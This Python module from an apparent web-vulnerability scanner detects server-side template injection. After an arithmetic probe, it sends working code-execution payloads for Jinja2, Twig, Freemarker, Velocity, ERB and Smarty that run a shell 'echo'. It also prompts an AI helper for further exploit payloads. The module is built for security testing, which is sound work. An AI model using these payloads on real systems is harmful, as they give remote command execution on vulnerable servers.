"""Server-Side Template Injection (SSTI) detection.

Detection is two-staged:

1. **arithmetic probe** — inject a template expression multiplying two random
   numbers in several engine syntaxes; if the *product* appears in the
   response, the input reaches a template evaluator.
2. **execution probe** — for a confirmed evaluator, attempt engine-specific
   expressions that echo the success marker (proving code, not just template,
   execution). Payloads are read-only PoCs.
"""

from __future__ import annotations

import secrets

from ..engine.models import Severity, Target
from .base import Module


class SSTI(Module):
    name = "ssti"
    vuln_class = "Server-Side Template Injection"
    severity = Severity.CRITICAL
    remediation = (
        "Do not render user input as part of a template. Pass user data only as "
        "bound context variables to a sandboxed engine, keep template source "
        "server-controlled, and disable dangerous globals/attribute access "
        "(e.g. Jinja2 SandboxedEnvironment)."
    )

    # Engine syntaxes for the arithmetic probe.
    _ARITH_SYNTAX = [
        "{{{{{a}*{b}}}}}",          # Jinja2 / Twig  -> {{ a*b }}
        "${{{a}*{b}}}",             # Freemarker / JSP EL -> ${a*b}
        "#{{{a}*{b}}}",             # Ruby / some EL   -> #{a*b}
        "<%= {a}*{b} %>",           # ERB
        "{a}*{b}",                  # smarty math (bare) sanity check excluded below
        "@({a}*{b})",               # Razor
        "*{{{a}*{b}}}",             # Thymeleaf spring
    ]

    # Execution payloads keyed by likely engine; each echoes MARKER.
    def _exec_payloads(self, marker: str) -> list[str]:
        return [
            # Jinja2
            "{{ self.__init__.__globals__.__builtins__.__import__('os')"
            f".popen('echo {marker}').read() }}}}",
            "{{ cycler.__init__.__globals__.os.popen('echo " + marker + "').read() }}",
            # Twig
            "{{ ['echo " + marker + "']|map('system')|join }}",
            "{{ ['echo " + marker + "']|filter('system') }}",
            # Freemarker
            '${"freemarker.template.utility.Execute"?new()("echo ' + marker + '")}',
            # Velocity
            "#set($e=\"\")$e.getClass().forName('java.lang.Runtime').getMethod("
            "'exec',$e.getClass().forName('java.lang.String'))"
            ".invoke($e.getClass().forName('java.lang.Runtime').getMethod('getRuntime')"
            f".invoke(null),'echo {marker}')",
            # ERB / Ruby
            "<%= `echo " + marker + "` %>",
            "#{`echo " + marker + "`}",
            # Smarty
            "{system('echo " + marker + "')}",
        ]

    async def run(self, target: Target) -> None:
        for point in target.injection_points():
            evaluator = await self._probe_arithmetic(point)
            if not evaluator:
                continue
            self.log.info(f"[ssti] template evaluator confirmed at {point.describe()}")
            marker = self.marker()
            payloads = self._exec_payloads(marker)
            ai_extra = await self.ai_expand(
                point, marker,
                context=f"Confirmed SSTI evaluator ({evaluator}) at "
                        f"{point.describe()} on {target.url}. Provide code-execution "
                        "PoCs echoing the marker for the detected engine.",
            )
            await self.try_payloads(point, payloads + ai_extra, marker, oracle="output")

    async def _probe_arithmetic(self, point) -> str | None:
        a = secrets.randbelow(900) + 100
        b = secrets.randbelow(90) + 10
        product = str(a * b)
        for syntax in self._ARITH_SYNTAX:
            if syntax == "{a}*{b}":
                continue  # too noisy on its own
            payload = syntax.format(a=a, b=b)
            result = await self.s.probe(
                point=point, payload=payload, marker=product,
                vuln_class=self.vuln_class, module=self.name,
            )
            if result is None:
                return None
            if product in result.response.text and payload not in result.response.text:
                return syntax
        return None
